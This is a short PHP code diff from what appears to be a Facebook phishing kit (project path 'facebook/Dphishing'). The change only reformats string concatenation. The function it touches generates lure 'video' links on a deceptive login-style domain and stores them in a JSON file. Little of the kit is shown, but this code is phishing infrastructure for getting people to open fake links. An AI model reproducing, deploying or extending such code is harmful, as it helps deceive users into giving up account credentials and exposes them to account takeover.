@@ -48,9 +48,9 @@ function generateURL($url){
         $urls[$idURL] = $url;
         file_put_contents('url.json',json_encode($urls));
         if ($_SERVER['HTTP_HOST'] == 'localhost') {
-            $urlGenerated = 'http://localhost/facebook/Dphishing/video/'.$idURL;
+            $urlGenerated = 'http://localhost/facebook/Dphishing/video/' . $idURL;
         }else{
-            $urlGenerated = 'http://login-auth.epizy.com/video/'.$idURL;
+            $urlGenerated = 'http://login-auth.epizy.com/video/' . $idURL;
         }
         $res['status'] = 200;
         $res['message'] = 'URL generada correctamente';
